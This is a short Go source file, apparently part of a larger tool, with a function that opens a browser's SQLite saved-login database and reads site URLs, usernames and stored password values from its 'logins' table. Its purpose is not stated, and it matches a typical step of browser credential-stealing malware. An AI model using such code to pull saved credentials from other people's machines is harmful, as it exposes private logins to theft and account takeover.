package main

import (
	"database/sql"
	"fmt"

	_ "github.com/mattn/go-sqlite3"
)

type dbData struct {
	url   string
	uname string
	psw   []byte
}

// 操作sqlite
func fetchDataFromDb(dbPath string, count int) []dbData {
	logger.Println("开始读取用户数据库...")
	db, dbErr := sql.Open("sqlite3", dbPath)
	if dbErr != nil {
		logger.Println("读取用户数据库（2）错误:" + dbErr.Error())
		return nil
	}
	defer db.Close()

	rows, dbErr := db.Query(fmt.Sprintf("SELECT action_url, username_value, password_value FROM logins LIMIT %d", count))
	if dbErr != nil {
		logger.Println("查询用户数据错误:" + dbErr.Error())
		return nil
	}
	defer rows.Close()

	dbRes := make([]dbData, count)
	i := 0
	for rows.Next() && i < count {
		// item := dbData{}
		rows.Scan(&dbRes[i].url, &dbRes[i].uname, &dbRes[i].psw)
		i++
	}
	return dbRes
}
